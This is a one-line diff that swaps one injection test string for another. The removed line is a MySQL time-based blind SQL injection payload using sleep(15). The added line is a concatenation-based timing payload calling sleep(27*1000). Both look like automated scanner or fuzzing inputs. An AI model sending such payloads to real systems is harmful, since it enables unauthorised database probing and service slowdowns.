@@ -1,1 +1,1 @@
-5550"XOR(555*if(now()=sysdate(),sleep(15),0))XOR"Z
+555"||sleep(27*1000)*azjfkw||"
